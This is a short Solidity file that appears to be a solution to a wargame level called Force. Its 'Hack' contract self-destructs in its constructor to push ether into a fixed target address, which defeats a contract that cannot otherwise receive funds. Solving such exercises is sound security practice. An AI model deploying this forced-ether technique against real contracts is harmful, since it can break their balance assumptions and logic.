// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

contract Hack {
    address payable target = payable(0x38083500e6a9E5Ff4d2236038A1cB5Fc4Eb92AA0);
    constructor() payable {
        selfdestruct(target);
    }

}